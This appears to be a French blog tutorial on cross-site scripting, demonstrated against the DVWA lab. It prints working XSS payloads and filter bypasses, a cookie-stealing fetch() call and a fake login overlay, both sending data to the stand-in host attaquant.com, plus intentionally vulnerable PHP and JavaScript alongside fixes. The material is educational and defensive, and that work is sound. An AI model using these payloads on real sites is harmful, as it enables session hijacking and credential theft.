---
layout: post
title: "Cross-Site Scripting (XSS): Tutoriel et Démonstration"
date: 2025-04-21
categories: tutorials
tags: [xss, web-security, owasp-top-10, labs]
---

# Cross-Site Scripting (XSS): Tutoriel et Démonstration

Le Cross-Site Scripting (XSS) reste l'une des vulnérabilités web les plus courantes, figurant dans le Top 10 de l'OWASP. Dans ce guide, je vais vous montrer comment identifier, exploiter et atténuer les vulnérabilités XSS à l'aide d'un environnement de laboratoire.

## Configuration de l'environnement de laboratoire

Pour cette démonstration, j'utiliserai le conteneur Docker DVWA (Damn Vulnerable Web Application), qui fournit un environnement sécurisé pour pratiquer les tests de sécurité web.

```bash
# Télécharger et exécuter DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

Une fois en cours d'exécution, accédez à DVWA à l'adresse http://localhost et connectez-vous avec:
- Nom d'utilisateur: `admin`
- Mot de passe: `password`

Réglez le niveau de sécurité sur "low" pour ce tutoriel.

## Comprendre les types de XSS

Avant de plonger dans l'exploitation, passons en revue les trois principaux types de XSS:

1. **XSS réfléchi**: Le script malveillant provient de la requête HTTP actuelle
2. **XSS stocké**: Le script malveillant est stocké sur le serveur cible
3. **XSS basé sur le DOM**: La vulnérabilité existe dans le code côté client

Dans ce lab, nous nous concentrerons sur le XSS réfléchi et stocké.

## Partie 1: XSS réfléchi

### Identifier la vulnérabilité

Naviguez vers la page "XSS (Reflected)" dans DVWA. Nous voyons un simple formulaire demandant un nom:

Lorsque vous soumettez un nom comme "John", l'application répond avec:
```
Hello John
```

C'est un candidat parfait pour tester le XSS puisque notre entrée est directement reflétée sur la page.

### Tests de base

Testons si l'application traite les balises HTML en injectant:

```html
<i>John</i>
```

Si le nom apparaît en italique, cela confirme que les balises HTML sont traitées, ce qui est un indicateur fort de vulnérabilité XSS.

### Exploiter la vulnérabilité

Essayons maintenant une simple charge utile JavaScript:

```html
<script>alert('XSS')</script>
```

Si une boîte d'alerte apparaît, nous avons confirmé avec succès la vulnérabilité XSS.

### Exploitation avancée

Pour une attaque plus pratique, essayons d'accéder aux cookies:

```html
<script>alert(document.cookie)</script>
```

Cela affiche les cookies de la victime, qui pourraient être capturés et envoyés au serveur d'un attaquant:

Pour une attaque réelle, un attaquant pourrait utiliser quelque chose comme:

```html
<script>
fetch('https://attaquant.com/voler?cookie='+document.cookie)
</script>
```

Cela enverrait les cookies de la victime au serveur de l'attaquant, permettant potentiellement le détournement de session.

## Partie 2: XSS stocké

### Identifier la vulnérabilité

Naviguez vers la page "XSS (Stored)" dans DVWA. Cette page simule un simple livre d'or ou système de commentaires.

### Tests et exploitation

Postons un commentaire avec la charge utile suivante:

```html
<script>alert('XSS stocké')</script>
```

Soumettez le formulaire et remarquez que rien ne se passe immédiatement. Cependant, lorsque vous actualisez la page ou lorsqu'un autre utilisateur la visite, le JavaScript s'exécute.

C'est plus dangereux que le XSS réfléchi car:
1. La charge utile persiste sur le serveur
2. Elle affecte tout utilisateur qui visite la page
3. Les utilisateurs n'ont pas besoin de cliquer sur un lien malveillant

### Impact réel

Dans un scénario réel, le XSS stocké peut être utilisé pour:
- Détournement de session
- Défiguration de sites web
- Propagation de malwares
- Attaques de phishing

Par exemple, une charge utile plus avancée pourrait voler des identifiants:

```html
<div style="position:absolute;top:0;left:0;width:100%;height:100%;background-color:white;z-index:1000;">
    <h2>Session expirée</h2>
    <p>Veuillez vous reconnecter:</p>
    <form action="https://attaquant.com/voler">
        Nom d'utilisateur: <input type="text" name="username"><br>
        Mot de passe: <input type="password" name="password"><br>
        <input type="submit" value="Connexion">
    </form>
</div>
```

Cela crée une fausse superposition de connexion qui envoie les identifiants au serveur de l'attaquant.

## Partie 3: XSS à des niveaux de sécurité plus élevés

Augmentons le niveau de sécurité de DVWA à "medium" et voyons comment les protections changent.

### Niveau de sécurité moyen

Au niveau de sécurité moyen, les charges utiles XSS de base seront filtrées. Essayez notre charge utile précédente:

```html
<script>alert('XSS')</script>
```

Elle ne fonctionne plus car DVWA utilise maintenant une forme de validation d'entrée.

En examinant le code source, nous pouvons voir que l'application filtre la balise `<script>`. Contournons cela avec une charge utile alternative:

```html
<img src="x" onerror="alert('XSS')">
```

Cela fonctionne car si les balises `<script>` sont filtrées, d'autres gestionnaires d'événements comme `onerror` ne le sont pas.

### Niveau de sécurité élevé

Au niveau de sécurité élevé, un filtrage plus sophistiqué est appliqué:

1. Les entités HTML sont encodées
2. Plusieurs gestionnaires d'événements sont bloqués
3. Plus de balises sont filtrées

Pour contourner cela, nous pourrions avoir besoin d'utiliser des techniques plus complexes comme:

```html
<iframe src="javascript:alert('XSS')"></iframe>
```

## Partie 4: Prévention et atténuation du XSS

Si vous développez des applications web, voici les principales défenses contre le XSS:

### 1. Validation des entrées

Validez toujours les entrées utilisateur côté serveur:
- Liste blanche des entrées acceptables
- Rejetez les entrées qui ne correspondent pas aux modèles attendus
- Validez le type de données, la longueur, le format et la plage

### 2. Encodage des sorties

Encodez la sortie avant de l'envoyer au navigateur:
- Encodez en HTML les caractères spéciaux (`<` devient `&lt;`, `>` devient `&gt;`, etc.)
- Utilisez les fonctions d'encodage fournies par le framework
- Appliquez un encodage spécifique au contexte (HTML, JS, URL, etc.)

### 3. Content Security Policy (CSP)

Implémentez des en-têtes CSP pour restreindre les ressources qui peuvent être chargées:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn-de-confiance.com
```

Cela empêche l'exécution de scripts en ligne et restreint les sources de script.

### 4. Utiliser des frameworks modernes

Les frameworks modernes comme React, Angular et Vue encodent automatiquement la sortie et fournissent des protections XSS intégrées.

### 5. Drapeaux HttpOnly et Secure

Définissez des cookies avec le drapeau HttpOnly pour empêcher l'accès JavaScript:

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure
```

## Test de défense XSS

Essayons quelques défenses simples dans nos exemples de code:

**Code PHP vulnérable:**
```php
<?php
echo "Bonjour " . $_GET['nom'];
?>
```

**Code PHP corrigé:**
```php
<?php
echo "Bonjour " . htmlspecialchars($_GET['nom'], ENT_QUOTES, 'UTF-8');
?>
```

**JavaScript vulnérable:**
```javascript
document.getElementById('salutation').innerHTML = 'Bonjour ' + nom;
```

**JavaScript corrigé:**
```javascript
document.getElementById('salutation').textContent = 'Bonjour ' + nom;
```

## Conclusion

Les vulnérabilités XSS restent courantes malgré qu'elles soient bien comprises car:
1. Les développeurs négligent souvent de valider tous les points d'entrée
2. Le code hérité a pu être écrit avant que le XSS ne soit bien compris
3. Les applications complexes ont de multiples points d'entrée faciles à manquer

En utilisant les techniques de prévention mentionnées ci-dessus et en testant régulièrement vos applications, vous pouvez réduire considérablement le risque d'attaques XSS.
